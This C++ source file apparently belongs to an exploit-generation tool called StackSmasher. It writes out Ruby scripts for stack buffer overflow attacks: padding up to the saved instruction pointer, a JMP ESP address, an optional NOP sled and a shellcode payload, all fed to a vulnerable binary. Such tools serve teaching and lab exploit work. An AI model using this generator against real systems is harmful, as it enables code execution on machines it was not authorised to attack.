#include "Script/Ruby/Ruby.hpp"

std::string Ruby::getUsage(std::string filename)
{
    return "ruby " + filename + "." + this->getExtension();
}

std::string Ruby::getExtension()
{
    return "rb";
}

std::string Ruby::build()
{
    std::string script = "";
    script += "#!/usr/bin/ruby\n";
    script += "\n";
    script += "# Exploit automatically generated by StackSmasher\n";
    script += "# https://github.com/McCaulay/StackSmasher\n";
    script += "\n";
    script += "# The vulnerable application binary filename\n";
    script += "application = \"" + Application::name + "\"\n";
    script += "\n";
    script += "# Use current directory if a path is not passed \n";
    script += "if !application['/']\n";
    script += "    application = './' + application\n";
    script += "end\n";
    script += "\n";
    script += "# The number of bytes until EIP in the buffer\n";
    script += "eipOffset = " + std::to_string(this->paddingCount) + "\n";
    script += "\n";
    script += "# Padding until EIP\n";
    script += "padding = \"" + this->getFormattedPaddingCharacter() + "\" * eipOffset\n";
    script += "\n";
    script += "# JMP ESP at " + this->getEipAddress() + "\n";
    script += "eip = \"" + this->getJmpEsp() + "\"\n";
    script += "\n";
    if (this->nopSledCount > 0)
    {
        script += "# NOP Sled of " + std::to_string(this->nopSledCount) + " bytes\n";
        script += "nop = \"\\x90\" * " + std::to_string(this->nopSledCount) + "\n";
        script += "\n";
    }
    script += "# Payload with " + std::to_string(payload.length()) + " bytes\n";
    script += "payload = \"" + this->getFormattedPayload() + "\"\n";
    script += "\n";
    script += "# Build exploit\n";
    script += "exploit = padding + eip";
    if (this->nopSledCount > 0)
        script += " + nop";
    script += " + payload\n";
    script += "\n";
    script += "# Execute vulnerable application\n";
    script += "system(application + ' \"' + exploit + '\"')\n";
    script += "\n";
    return script;
}
